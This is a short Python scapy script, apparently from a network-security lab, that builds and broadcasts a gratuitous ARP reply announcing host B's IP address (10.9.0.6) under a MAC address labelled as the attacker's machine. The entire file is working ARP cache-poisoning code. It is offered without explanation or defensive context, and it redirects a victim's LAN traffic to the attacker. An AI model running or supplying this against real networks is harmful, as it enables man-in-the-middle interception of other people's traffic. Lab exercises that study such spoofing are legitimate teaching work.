from scapy.all import *

# Construct ARP gratuitous packet
E = Ether()
A = ARP()
A.op = 2  # 2 for ARP reply
A.hwsrc = "02:42:0a:09:00:69"  # MAC address of the attacker machine (M)
A.psrc = "10.9.0.6"  # IP address of host B
A.hwdst = "FF:FF:FF:FF:FF:FF"  # Broadcast MAC address
A.pdst = "10.9.0.6"  # IP address of host B

pkt = E / A

# Send the packet
sendp(pkt)

